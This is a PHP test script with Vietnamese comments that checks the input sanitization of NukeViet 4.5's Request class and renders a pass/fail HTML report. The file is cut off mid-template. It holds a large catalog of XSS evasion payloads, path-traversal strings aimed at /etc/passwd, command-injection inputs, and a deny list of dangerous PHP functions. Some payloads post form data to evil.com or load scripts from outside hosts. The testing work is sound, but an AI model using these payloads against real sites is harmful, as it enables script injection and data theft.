<?php

/**
 * Bài test bảo mật cho class Request của NukeViet 4.5
 * Di chuyển file ra root site ngang hàng với index.php để chạy http://my-domain/test_request.php
 *
 * ====================================================================
 * NGUỒN THAM KHẢO & CÁC BỘ TEST XSS BÀI BẢN ĐÃ ĐƯỢC ĐỌC:
 * 1. HTML Purifier Test Suite: https://github.com/ezyang/htmlpurifier/tree/master/tests
 * 2. OWASP XSS Filter Evasion Cheat Sheet: https://raw.githubusercontent.com/OWASP/CheatSheetSeries/master/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md
 * 3. PayloadsAllTheThings (XSS Injection): https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/XSS%20Injection/README.md
 * 4. PortSwigger XSS Cheat Sheet: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 * ====================================================================
 */

define('NV_SYSTEM', true);

// Xac dinh thu muc goc cua site
define('NV_ROOTDIR', pathinfo(str_replace(DIRECTORY_SEPARATOR, '/', __FILE__), PATHINFO_DIRNAME));

require NV_ROOTDIR . '/includes/mainfile.php';

// Biến lưu trữ kết quả test
$results = [];

/**
 * Hàm hỗ trợ chạy test và ghi nhận kết quả
 */
function run_test($name, $method, $input, $expected_behavior, $callback, $callMethod = 'get_string', $extra_params = [])
{
    global $nv_Request, $results;

    // Lưu lại request cũ
    $old_post = $_POST;
    $old_get = $_GET;

    // Xác định post/get hay các phương thức khác
    $is_post = in_array($method, ['POST', 'EDITOR', 'TEXTAREA'], true);
    if ($is_post) {
        $_POST['test_var'] = $input;
    } else {
        $_GET['test_var'] = $input;
    }

    $output = null;
    $req_mode = $is_post ? 'post' : 'get';

    // Gọi hàm tương ứng của $nv_Request
    if ($callMethod === 'get_string') {
        $output = $nv_Request->get_string('test_var', $req_mode, '');
    } elseif ($callMethod === 'get_int') {
        $output = $nv_Request->get_int('test_var', $req_mode, 0);
    } elseif ($callMethod === 'get_float') {
        $output = $nv_Request->get_float('test_var', $req_mode, 0.0);
    } elseif ($callMethod === 'get_bool') {
        $output = $nv_Request->get_bool('test_var', $req_mode, false);
    } elseif ($callMethod === 'get_title') {
        $specialchars = isset($extra_params['specialchars']) ? $extra_params['specialchars'] : false;
        $output = $nv_Request->get_title('test_var', $req_mode, '', $specialchars);
    } elseif ($callMethod === 'get_editor') {
        $allowed_tags = isset($extra_params['allowed_tags']) ? $extra_params['allowed_tags'] : 'b,i,u,a,img,p,br,div,span';
        $output = $nv_Request->get_editor('test_var', '', $allowed_tags);
    } elseif ($callMethod === 'get_textarea') {
        $allowed_tags = isset($extra_params['allowed_tags']) ? $extra_params['allowed_tags'] : '';
        $save = isset($extra_params['save']) ? $extra_params['save'] : false;
        $output = $nv_Request->get_textarea('test_var', '', $allowed_tags, $save);
    } elseif ($callMethod === 'get_array') {
        $output = $nv_Request->get_array('test_var', $req_mode, []);
    } elseif ($callMethod === 'get_typed_array') {
        $type = isset($extra_params['type']) ? $extra_params['type'] : 'string';
        $output = $nv_Request->get_typed_array('test_var', $req_mode, $type, []);
    }

    // Phục hồi
    $_POST = $old_post;
    $_GET = $old_get;

    // Chạy kiểm tra kết quả dựa trên callback
    $is_passed = false;
    if (is_callable($callback)) {
        $is_passed = $callback($output);
    } elseif (is_string($callback) && function_exists($callback)) {
        $is_passed = $callback($output);
    } else {
        // Nếu callback là giá trị cụ thể, so sánh trực tiếp
        $is_passed = ($output === $callback);
    }

    $results[] = [
        'name' => $name,
        'method' => $method . ' (' . $callMethod . ')',
        'input' => $input,
        'output' => $output,
        'expected' => $expected_behavior,
        'passed' => $is_passed
    ];
}

// Hàm kiểm tra mặc định: PASS nếu kết quả an toàn (không chứa JS thực thi)
function is_safe_xss($out)
{
    if (!is_string($out)) return false;

    // Nếu tag script sống sót
    if (preg_match('/<script\b/i', $out)) return false;

    // MẸO: Xoá tất cả các giá trị nằm trong cặp dấu nháy kép hoặc nháy đơn
    $stripped_attributes = preg_replace('/"[^"]*"|\'[^\']*\'/', '""', $out);

    // Nếu các event on* sống sót bên trong tag (kiểm tra trên chuỗi đã bóc tách nháy kép)
    if (preg_match('/<[^>]+on[a-z]+\s*=/i', $stripped_attributes)) return false;

    // Nếu javascript: protocol sống sót trong href/src/formaction/data/action
    if (preg_match('/<[^>]+(?:href|src|data|formaction|action)\s*=\s*[\'"]?\s*j[a-z0-9&\#;]+v[a-z0-9&\#;]+a[a-z0-9&\#;]+s[a-z0-9&\#;]+c[a-z0-9&\#;]+r[a-z0-9&\#;]+i[a-z0-9&\#;]+p[a-z0-9&\#;]+t:/i', $out)) return false;
    // Nếu vbscript:/livescript:/mocha: protocol sống sót
    if (preg_match('/<[^>]+(?:href|src|data|formaction|action)\s*=\s*[\'"]?\s*(?:vbscript|livescript|mocha)\s*:/i', $out)) return false;
    // Nếu data:text/html sống sót
    if (preg_match('/<[^>]+data:text\/html/i', $out)) return false;
    // Nếu css expression sống sót
    if (preg_match('/<[^>]+expression\s*\(/i', $out)) return false;

    return true;
}

function is_int_val($out)
{
    return is_int($out);
}

function is_float_val($out)
{
    return is_float($out);
}

function is_bool_val($out)
{
    return is_bool($out);
}

function is_no_tags($out)
{
    if (!is_string($out)) return false;
    return strip_tags($out) === $out && strpos($out, '<') === false && strpos($out, '>') === false;
}

function is_safe_array($out)
{
    if (!is_array($out)) return false;
    foreach ($out as $v) {
        if (is_array($v)) {
            if (!is_safe_array($v)) return false;
        } else {
            if (is_string($v) && !is_safe_xss($v)) return false;
        }
    }
    return true;
}

function is_command_filtered($out)
{
    if (!is_string($out)) return false;
    // disablecomannds: base64_decode, cmd, passthru, eval, exec, system, fopen, fsockopen, file, file_get_contents, readfile, unlink
    $cmds = ['base64_decode', 'cmd', 'passthru', 'eval', 'exec', 'system', 'fopen', 'fsockopen', 'file', 'file_get_contents', 'readfile', 'unlink'];
    foreach ($cmds as $cmd) {
        if (preg_match('/' . preg_quote($cmd) . '\s*\(/i', $out)) {
            return false;
        }
    }
    return true;
}

// ====================================================================
// CÁC BỘ TEST CASE CHI TIẾT
// ====================================================================

// 1. Nhóm XSS payloads (dành cho POST get_string và EDITOR get_editor)
$xss_payloads = [
    // Nhóm Polyglots (payload đa ngữ cảnh mạnh nhất hiện nay từ OWASP)
    ['OWASP Polyglot XSS', 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//\'>'],
    ['JaVasCript Polyglot', '\'>"><script>alert("XSS")</script>&<'],

    // Nhóm làm nhiễu thẻ HTML (Malformed Tags)
    ['Malformed A Tag', '\<a onmouseover="alert(1)"\>xxs link\</a\>'],
    ['Malformed IMG Tag', '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>'],
    ['No Quotes Error', '<IMG SRC= onmouseover="alert(\'xxs\')">'],
    ['Half Open Tag', '<iframe src=javascript:alert(1) <'],
    ['Extraneous Brackets', '<<SCRIPT>alert("XSS");//\<</SCRIPT>'],

    // Nhóm lẩn tránh bộ lọc ký tự chuỗi bằng mã hoá (Encodings)
    ['From charCode (Bypass Quote)', '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>'],
    ['Decimal HTML Entities', '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>'],
    ['Decimal HTML without Semicolon', '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>'],
    ['Hexadecimal HTML without Semicolon', '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>'],

    // Nhóm lợi dụng khoảng trắng đặc biệt để phá bộ lọc Regex (Tabs, Newlines, Nulls)
    ['Embedded Tab in Protocol', '<a href="jav	ascript:alert(\'XSS\');">Click</a>'],
    ['Embedded Encoded Tab', '<a href="jav&#x09;ascript:alert(\'XSS\');">Click</a>'],
    ['Embedded Newline', '<a href="jav&#x0A;ascript:alert(\'XSS\');">Click</a>'],
    ['Embedded Carriage Return', '<a href="jav&#x0D;ascript:alert(\'XSS\');">Click</a>'],
    ['Null Char Injection', '<IMG SRC=java\0script:alert(1)>'],
    ['Spaces/Meta Chars Before Protocol', '<a href=" &#14;  javascript:alert(\'XSS\');">Click Me</a>'],
    ['Non-alpha-non-digit Separator', '<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>'],
    ['Special char Separator', '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>'],

    // Nhóm khai thác thuộc tính HTML5 & SVG (Rất khó lọc)
    ['SVG Onload', '<svg/onload=alert(\'XSS\')>'],
    ['HTML5 Autofocus Focus', '<input autofocus onfocus=alert(1)>'],
    ['HTML5 Formaction', '<form><button formaction=javascript:alert(1)>XSS</button></form>'],
    ['Iframe SrcDoc HTML5', '<iframe srcdoc="&lt;img src=1 onerror=alert(1)&gt;"></iframe>'],
    ['ES6 Template Literal', 'Set.constructor`alert\x28document.domain\x29`'],

    // Nhóm CSS & Object Injection
    ['CSS Expression', '<DIV STYLE="width: expression(alert(1));">'],
    ['CSS Behavior', '<DIV STYLE="behavior: url(http://xss.rocks/xss.htc);">'],
    ['Data URI Base64 Object', '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>'],
    ['List Style Image', '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS</br>'],

    // Kỹ thuật Escaping JS Escapes (Lỗi khi gắn vào thẻ script có sẵn)
    ['Escape JS Escapes', '\";alert(\'XSS\');//'],

    // Nhóm 8: Entity Decoding Edge Cases
    ['ENTITY &colon; bypass', '<a href="javascript&colon;alert(1)">Click</a>'],
    ['ENTITY &Tab; &NewLine;', '<a href="jav&Tab;ascript&colon;alert&lpar;1&rpar;">x</a>'],
    ['ENTITY %3A%2F%2F removal', 'http%3A%2F%2Fevil.com/xss'],
    ['ENTITY Triple encode', '&amp;#60;script&amp;#62;alert(1)&amp;#60;/script&amp;#62;'],

    // Nhóm 9: mXSS & DOM Clobbering
    ['mXSS Backtick', '<div id="x`tabindex=1`onfocus=alert(1)"></div>'],
    ['mXSS SVG Use', '<svg><use href="data:image/svg+xml,<svg onload=alert(1)>"></use></svg>'],
    ['DOM Clobbering Form', '<form id="location"><input name="href" value="javascript:alert(1)"></form>'],
    ['DOM Clobbering Anchor', '<a id="__proto__"><a id="__proto__" name="isAdmin" href="true">'],
    ['Template Injection', '{{constructor.constructor("alert(1)")()}}'],
    ['SVG Animate XSS', '<svg><animate attributeName="href" values="javascript:alert(1)"/><a><text>click</text></a></svg>'],
    ['MathML XSS', '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>'],
    ['Details ontoggle', '<details open ontoggle=alert(1)><summary>test</summary></details>'],
    ['Video source onerror', '<video><source onerror=alert(1)></video>'],
    ['Marquee onstart', '<marquee onstart=alert(1)>'],
    ['Meta Refresh', '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'],
    ['Base Tag Hijack', '<base href="javascript:alert(1)//"><a href="x">Click</a>'],
    ['Object Data JS', '<object data="javascript:alert(1)">'],
    ['PortSwigger input onauxclick', '<input onauxclick=alert(1)>'],
    ['PortSwigger body onbeforescriptexecute', '<body onbeforescriptexecute=alert(1)>'],
    ['PortSwigger a onpointerdown', '<a onpointerdown=alert(1)>Link</a>'],
    ['PortSwigger a onpointerenter', '<a onpointerenter=alert(1)>Link</a>'],
    ['PortSwigger a onpointerleave', '<a onpointerleave=alert(1)>Link</a>'],
    ['PortSwigger input onpaste', '<input onpaste=alert(1)>'],
    ['PortSwigger input onsearch', '<input type=search onsearch=alert(1)>'],
    ['PortSwigger body onwheel', '<body onwheel=alert(1)>'],
    ['PortSwigger body oncopy', '<body oncopy=alert(1)>'],
    ['PortSwigger body oncut', '<body oncut=alert(1)>'],
    ['PortSwigger form onformdata', '<form onformdata=alert(1)><input type=submit></form>'],
    ['PortSwigger input oninvalid', '<input required oninvalid=alert(1)>'],
    ['PortSwigger SVG image href', '<svg><image href="javascript:alert(1)"></svg>'],
    ['PortSwigger MathML image href', '<math><mtext><image href="javascript:alert(1)"></math>'],
    ['PortSwigger iframe onload', '<iframe onload=alert(1)>'],
    ['PortSwigger body onresize', '<body onresize=alert(1)>'],
    ['PortSwigger xmp breakout', '<xmp><p title="</xmp><img src=x onerror=alert(1)>">'],
    ['PortSwigger body onanimationstart', '<body onanimationstart=alert(1)>'],
    ['PortSwigger body ontransitionstart', '<body ontransitionstart=alert(1)>'],
    ['PortSwigger slash obfuscation a', '<a/href=javascript:alert(1)>Click</a>'],
    ['PortSwigger slash obfuscation img', '<img/src=x/onerror=alert(1)>'],
    ['PortSwigger table background', '<table background="javascript:alert(1)">'],
    ['PortSwigger SVG xlink:href', '<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100"/></a></svg>'],
    ['PortSwigger MathML a href', '<math><a href="javascript:alert(1)">Click</a></math>'],
    ['PortSwigger form action js', '<form action="javascript:alert(1)"><input type=submit></form>'],
    ['PortSwigger form button formaction', '<form><button formaction="//evil.com/steal">Submit</button></form>'],
    ['PortSwigger input image formaction', '<input type=image formaction="//evil.com/steal">'],
    ['PortSwigger input submit formmethod', '<input type=submit formmethod=post formtarget=_blank formaction=//evil.com/steal>'],
    ['PortSwigger style background js', '<div style="background:url(javascript:alert(1))">'],
    ['PortSwigger style content js', '<div style="content:url(javascript:alert(1))">'],
    ['PortSwigger a href data URI', '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click</a>'],
    ['PortSwigger iframe data URI', '<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>'],
    ['PortSwigger SVG CDATA breakout', '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>'],
    ['PortSwigger script data URI', '<script src="data:text/javascript,alert(1)"></script>'],
    ['PortSwigger input image src js', '<input type="image" src="javascript:alert(1)">'],
    ['PortSwigger body webkit animation', '<body onwebkitanimationend=alert(1)>'],
    ['PortSwigger body webkit transition', '<body onwebkittransitionend=alert(1)>'],
    ['PortSwigger href newline comment', '<a href="javascript:/*%0a*/alert(1)">Click</a>'],

    // --- Bổ sung từ Kế hoạch (OWASP, PayloadsAllTheThings, HTML Purifier, PortSwigger) ---
    // Nhóm OWASP Filter Evasion
    ['OWASP Empty/Missing SRC', '<IMG SRC=/ onerror="alert(1)"></img>'],
    ['OWASP Missing SRC Attribute', '<IMG onmouseover="alert(\'xxs\')">'],
    ['OWASP Protocol Resolution Bypass', '<SCRIPT SRC=//xss.rocks/.j>'],
    ['OWASP End Title Tag Breakout', '</TITLE><SCRIPT>alert("XSS");</SCRIPT>'],
    ['OWASP Body Image Background', '<BODY BACKGROUND="javascript:alert(\'XSS\')">'],
    ['OWASP Input Image Src', '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">'],
    ['OWASP Body Onload Space Bypass', '<BODY ONLOAD=alert(\'XSS\')>'],

    // Nhóm PayloadsAllTheThings
    ['PATT Eval Obfuscation (toString)', '<script>eval(8680439..toString(30))(983801..toString(36))</script>'],
    ['PATT Double Event Handler', '<img src=x oneonerrorrror=alert(1)>'],
    ['PATT Form Feed in SVG', "<svg\x0Conload=alert(1)>"],
    ['PATT SVG ID Eval', '<svg id=alert(1) onload=eval(id)>'],

    // Nhóm HTML Purifier Evasion & Edge Cases
    ['HTML Purifier Invalid URL Protocol', '<a href="javascript://%250Aalert(1)">Click</a>'],
    ['HTML Purifier CSS Escape Expression', '<div style="x:\expression(alert(1))">'],
    ['HTML Purifier Unrecognized Custom Tag', '<customtag onmouseover="alert(1)">Hover me</customtag>'],

    // Nhóm PortSwigger Cheat Sheet (Mở rộng)
    ['PortSwigger SVG animatetransform', '<svg><animatetransform onbegin=alert(1)>'],
    ['PortSwigger HTML Entity &apos; bypass', '<a href="javascript:&apos;;&alert(1)">Click</a>'],
    ['PortSwigger Data URI in Object', '<object data="data:text/html,<script>alert(1)</script>">']
];

// Chạy test các XSS payloads qua POST get_string và EDITOR get_editor
foreach ($xss_payloads as $index => $payload) {
    run_test(
        "XSS #" . ($index + 1) . " (POST) " . $payload[0],
        'POST',
        $payload[1],
        'Javascript/XSS phải bị lọc/mã hoá HTML',
        'is_safe_xss',
        'get_string'
    );

    run_test(
        "XSS #" . ($index + 1) . " (EDITOR) " . $payload[0],
        'EDITOR',
        $payload[1],
        'Javascript/XSS phải bị lọc/mã hoá HTML trong Editor',
        'is_safe_xss',
        'get_editor',
        ['allowed_tags' => 'b,i,u,a,img,p,br,div,span']
    );
}

// 2. Nhóm 1: GET mode - test `security_get()` path
$get_payloads = [
    ['GET Path Traversal', '../../../etc/passwd', 'Path traversal phải bị loại bỏ ../', function ($out) {
        return strpos($out, '../') === false;
    }],
    ['GET Double-Encoded Path', '..%252F..%252F..%252Fetc%252Fpasswd', 'Double-encode: unhtmlentities decode %xx, path traversal không được sống sót', function ($out) {
        return strpos($out, '../') === false;
    }],
    ['GET Null Byte', "test\x00admin", 'Null byte phải bị lọc hoặc không gây hại', function ($out) {
        return strpos($out, "\x00") === false;
    }],
    ['GET Tab/Newline Stripping', "multi\tline\nstring", 'Tab và Newline phải bị xóa', function ($out) {
        return strpos($out, "\t") === false && strpos($out, "\n") === false && strpos($out, "\r") === false;
    }],
    ['GET Double URL Encode', '%253Cscript%253Ealert(1)%253C%252Fscript%253E', 'Double URL encode XSS phải bị mã hóa', function ($out) {
        return strpos($out, '<script') === false;
    }],
    ['GET CDATA Bypass', '<![cdata[<script>alert(1)</script>]]>', 'CDATA script phải bị strip/mã hóa', 'is_safe_xss'],
    ['GET Unicode Escape', '\u003cscript\u003ealert(1)\u003c/script\u003e', 'Unicode escape script phải được xử lý an toàn', function ($out) {
        return strpos($out, '<script') === false;
    }]
];

foreach ($get_payloads as $index => $payload) {
    run_test(
        "GET #" . ($index + 1) . " " . $payload[0],
        'GET',
        $payload[1],
        $payload[2],
        $payload[3],
        'get_string'
    );
}

// 3. Nhóm 2: Ép kiểu dữ liệu (get_int, get_float, get_bool)
$type_casting_payloads = [
    // get_int
    ['INT XSS in number', 'GET', '1;alert(1)', 'Ép kiểu về 1', 1, 'get_int'],
    ['INT String Value', 'GET', 'abc', 'Ép kiểu về 0', 0, 'get_int'],
    ['INT SQL Injection', 'GET', '1 OR 1=1', 'Ép kiểu về 1', 1, 'get_int'],
    ['INT Scientific', 'GET', '1e5', 'Ép kiểu về 100000 (PHP int cast cho chuỗi numeric)', 100000, 'get_int'],
    ['INT Empty String', 'GET', '', 'Ép kiểu về 0', 0, 'get_int'],

    // get_float
    ['FLOAT Scientific Notation', 'GET', '1.23e3', 'Ép kiểu về float 1230.0', 1230.0, 'get_float'],
    ['FLOAT String Value', 'GET', 'NaN', 'Ép kiểu về float 0.0', 0.0, 'get_float'],

    // get_bool
    ['BOOL Truthy String', 'GET', 'yes', 'Ép kiểu về true', true, 'get_bool'],
    ['BOOL Numeric Zero', 'GET', '0', 'Ép kiểu về false', false, 'get_bool'],
    ['BOOL Empty String', 'GET', '', 'Ép kiểu về false', false, 'get_bool']
];

foreach ($type_casting_payloads as $index => $payload) {
    run_test(
        "CAST #" . ($index + 1) . " " . $payload[0],
        $payload[1],
        $payload[2],
        $payload[3],
        $payload[4],
        $payload[5]
    );
}

// 4. Nhóm 3: Tiêu đề (get_title)
$title_payloads = [
    ['TITLE Script Tag', '<script>alert(1)</script>Normal Title', 'Loại bỏ thẻ script nhưng giữ lại nội dung bên trong', 'alert(1)Normal Title', false],
    ['TITLE Special Chars Encoding', 'Title with "quotes" & <brackets>', 'Loại bỏ hoàn toàn nội dung trong ngoặc nhọn do strip_tags', 'Title with &quot;quotes&quot; &amp;', true],
    ['TITLE Backslash', 'Title with \\backslash\\', 'Mã hóa ký tự backslash', 'Title with &#x005C;backslash&#x005C;', true],
    ['TITLE Parentheses', 'Title with (parens) and [brackets]', 'Mã hóa ngoặc đơn và ngoặc vuông', 'Title with &#40;parens&#41; and &#91;brackets&#93;', true]
];

foreach ($title_payloads as $index => $payload) {
    run_test(
        "TITLE #" . ($index + 1) . " " . $payload[0],
        'GET',
        $payload[1],
        $payload[2],
        $payload[3],
        'get_title',
        ['specialchars' => $payload[4]]
    );
}

// 5. Nhóm 4 & 5: Các thuộc tính nâng cao trong Editor và Textarea
$editor_textarea_payloads = [
    // get_editor
    ['EDITOR srcdoc XSS', 'EDITOR', '<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>', 'Xử lý đệ quy srcdoc và loại bỏ event handler', 'is_safe_xss', 'get_editor', ['allowed_tags' => 'iframe']],
    ['EDITOR Data URI SVG', 'EDITOR', '<img src="data:image/svg+xml,<svg onload=alert(1)>">', 'Loại bỏ data URI chứa script', 'is_safe_xss', 'get_editor', ['allowed_tags' => 'img']],
    ['EDITOR CSS @import', 'EDITOR', '<div style="@import url(http://evil.com/xss.css)">test</div>', 'Loại bỏ import CSS nguy hiểm', 'is_safe_xss', 'get_editor', ['allowed_tags' => 'div']],
    ['EDITOR embed allowscriptaccess', 'EDITOR', '<embed src="movie.swf" allowscriptaccess="always">', 'Tự động sửa allowscriptaccess thành never', function ($out) {
        return strpos($out, 'allowscriptaccess="never"') !== false || strpos($out, 'allowscriptaccess=[@{never}@]') !== false || strpos($out, 'allowscriptaccess') === false;
    }, 'get_editor', ['allowed_tags' => 'embed']],

    // get_textarea
    ['TEXTAREA Save Mode BR', 'TEXTAREA', "line1\nline2", 'Chuyển đổi xuống dòng thành <br />', 'line1<br />line2', 'get_textarea', ['save' => true]]
];

foreach ($editor_textarea_payloads as $index => $payload) {
    run_test(
        "ADVANCED #" . ($index + 1) . " " . $payload[0],
        $payload[1],
        $payload[2],
        $payload[3],
        $payload[4],
        $payload[5],
        isset($payload[6]) ? $payload[6] : []
    );
}

// 6. Nhóm 6: Mảng và ép kiểu mảng (get_array, get_typed_array)
$array_payloads = [
    ['ARRAY Nested XSS', 'POST', ['key1' => '<script>alert(1)</script>', 'key2' => 'safe'], 'Lọc sạch các phần tử mảng lồng nhau', 'is_safe_array', 'get_array'],
    ['TYPED_ARRAY int XSS', 'POST', ['1;alert(1)', '2', 'abc'], 'Ép kiểu tất cả phần tử về int', [1, 2, 0], 'get_typed_array', ['type' => 'int']]
];

foreach ($array_payloads as $index => $payload) {
    run_test(
        "ARRAY #" . ($index + 1) . " " . $payload[0],
        $payload[1],
        $payload[2],
        $payload[3],
        $payload[4],
        $payload[5],
        isset($payload[6]) ? $payload[6] : []
    );
}

// 7. Nhóm 7: Bypass các lệnh bị cấm ($disablecomannds)
$command_payloads = [
    ['GET eval() injection', 'eval("malicious code")', 'Lọc lệnh eval', 'is_command_filtered'],
    ['GET system() injection', 'system("ls -la")', 'Lọc lệnh system', 'is_command_filtered'],
    ['GET exec comment bypass', 'ex/**/ec("cmd")', 'Bypass thất bại: /**/ bị strip bởi unhtmlentities trước → exec() bị lọc', 'is_command_filtered'],
    ['GET Case Variation Eval', 'EvAl("code")', 'Lọc lệnh Eval không phân biệt hoa thường', 'is_command_filtered']
];

foreach ($command_payloads as $index => $payload) {
    run_test(
        "COMMAND #" . ($index + 1) . " " . $payload[0],
        'GET',
        $payload[1],
        $payload[2],
        $payload[3],
        'get_string'
    );
}

// 8. Nhóm 10: Dữ liệu bình thường hợp lệ (Functional Correctness)
$functional_payloads = [
    ['Vietnamese UTF-8', 'Xin chào Việt Nam 🇻🇳', 'Giữ nguyên tiếng Việt và emoji hợp lệ', 'Xin chào Việt Nam 🇻🇳'],
    ['Emoji chars', '😀🎉💻', 'Giữ nguyên emoji', '😀🎉💻'],
    ['EDITOR Legal Link', '<a href="https://example.com">Link</a>', 'Giữ nguyên thẻ a và thuộc tính href', function ($out) {
        return strpos($out, 'href="https://example.com"') !== false && strpos($out, 'Link</a>') !== false;
    }, 'get_editor', ['allowed_tags' => 'a']]
];

foreach ($functional_payloads as $index => $payload) {
    run_test(
        "FUNC #" . ($index + 1) . " " . $payload[0],
        isset($payload[4]) ? 'EDITOR' : 'GET',
        $payload[1],
        $payload[2],
        $payload[3],
        isset($payload[4]) ? $payload[4] : 'get_string',
        isset($payload[5]) ? $payload[5] : []
    );
}

// 9. Nhóm bổ sung: Kịch bản bảo mật phát hiện từ review code Request.php
$security_gap_tests = [
    // vbscript/livescript protocol phải bị lọc bởi filterAttr
    ['VBScript in href', 'POST', '<a href="vbscript:MsgBox(1)">Click</a>', 'vbscript: protocol phải bị lọc', 'is_safe_xss', 'get_string'],
    ['LiveScript in href', 'POST', '<a href="livescript:alert(1)">Click</a>', 'livescript: protocol phải bị lọc', 'is_safe_xss', 'get_string'],
    // formaction KHÔNG nằm trong $disabledattributes (chỉ có action) → tiềm ẩn form redirect
    ['Formaction Redirect', 'EDITOR', '<button formaction="//evil.com/steal">Submit</button>', 'formaction nên bị lọc (không nằm trong disabledattributes)', function ($out) {
        return strpos($out, 'formaction') === false;
    }, 'get_editor', ['allowed_tags' => 'button,form']],
    // Data URI base64 chứa script trong img src
    ['Data URI Base64 img', 'EDITOR', '<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">', 'Data URI chứa script phải bị lọc', 'is_safe_xss', 'get_editor', ['allowed_tags' => 'img']],
    // Nested entity decode trong href
    ['Nested Entity href', 'POST', '<a href="j&#97;v&#97;script:alert(1)">x</a>', 'Entity decode rồi lọc javascript: protocol', 'is_safe_xss', 'get_string'],
    // ping attribute là SSRF vector, nằm trong $disabledattributes
    ['Ping Attribute SSRF', 'EDITOR', '<a href="https://example.com" ping="//evil.com/track">Link</a>', 'ping attribute phải bị lọc (nằm trong disabledattributes)', function ($out) {
        return strpos($out, 'ping=') === false && strpos($out, 'ping ') === false;
    }, 'get_editor', ['allowed_tags' => 'a']],
    // Giá trị bắt đầu bằng số nhưng chứa script tag
    ['Numeric-prefix XSS', 'GET', '123<script>alert(1)</script>', 'Tag script phải bị strip dù giá trị bắt đầu bằng số', function ($out) {
        return strpos($out, '<script') === false;
    }, 'get_string'],
    // on* attribute không có giá trị
    ['Empty Event Handler', 'POST', '<img src=x onerror>', 'on* attribute phải bị lọc dù không có giá trị', function ($out) {
        return !preg_match('/<[^>]+onerror/i', $out);
    }, 'get_string'],
];

foreach ($security_gap_tests as $index => $payload) {
    run_test(
        "GAP #" . ($index + 1) . " " . $payload[0],
        $payload[1],
        $payload[2],
        $payload[3],
        $payload[4],
        $payload[5],
        isset($payload[6]) ? $payload[6] : []
    );
}

// ====================================================================
// OUTPUT KẾT QUẢ
// ====================================================================
?>
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <title>BÁO CÁO KIỂM THỬ AN TOÀN REQUEST CLASS (TOÀN DIỆN)</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #fcfcfc;
            color: #333;
        }

        table {
            border-collapse: collapse;
            width: 100%;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
            margin-bottom: 20px;
            background: white;
        }

        th,
        td {
            border: 1px solid #ccc;
            padding: 10px;
            text-align: left;
        }

        th {
            background: #f4f4f4;
            position: sticky;
            top: 0;
        }

        .pass {
            color: white;
            background-color: #28a745;
            padding: 3px 8px;
            border-radius: 3px;
            font-weight: bold;
        }

        .fail {
            color: white;
            background-color: #dc3545;
            padding: 3px 8px;
            border-radius: 3px;
            font-weight: bold;
        }

        pre {
            background: #f8f9fa;
            padding: 8px;
            border-radius: 3px;
            border: 1px solid #e9ecef;
            white-space: pre-wrap;
            word-break: break-all;
            margin: 0;
            font-size: 13px;
        }

        .source-link {
            color: #0366d6;
            text-decoration: none;
        }

        .source-link:hover {
            text-decoration: underline;
        }

        .tab-title {
            border-bottom: 2px solid #555;
            padding-bottom: 5px;
            margin-top: 30px;
        }
    </style>
</head>

<body>
    <h1>BÁO CÁO KIỂM THỬ LỚP REQUEST</h1>
    <p>File test này bao gồm <strong><?php echo count($results); ?></strong> lượt kiểm thử bao quát XSS (OWASP), Path Traversal, Command Injection, Type Casting, Title Sanitization, Editor Attributes, Array, và Functional Correctness.</p>
    <?php
    $passed_results = [];
    $failed_results = [];
    foreach ($results as $r) {
        if ($r['passed']) {
            $passed_results[] = $r;
        } else {
            $failed_results[] = $r;
        }
    }
    ?>

    <h2 style="color: #dc3545;" class="tab-title">I. TRẠNG THÁI THẤT BẠI (FAIL - <?php echo count($failed_results); ?> cases)</h2>
    <table>
        <tr>
            <th width="20%">Tên Test & Method</th>
            <th width="30%">Dữ liệu kiểm thử (Input)</th>
            <th width="30%">Kết quả đầu ra (Output)</th>
            <th width="12%">Kỳ vọng</th>
            <th width="8%">Trạng thái</th>
        </tr>
        <?php if (count($failed_results) == 0): ?>
            <tr>
                <td colspan="5" style="text-align:center; font-weight: bold; color: #28a745; padding: 20px;">Tuyệt vời! Không có testcase nào bị thất bại (100% Passed).</td>
            </tr>
        <?php else: ?>
            <?php foreach ($failed_results as $r): ?>
                <tr>
                    <td><strong><?php echo htmlspecialchars($r['name']); ?></strong><br><small><?php echo htmlspecialchars($r['method']); ?></small></td>
                    <td>
                        <pre><?php echo htmlspecialchars(var_export($r['input'], true)); ?></pre>
                    </td>
                    <td>
                        <pre><?php echo htmlspecialchars(var_export($r['output'], true)); ?></pre>
                    </td>
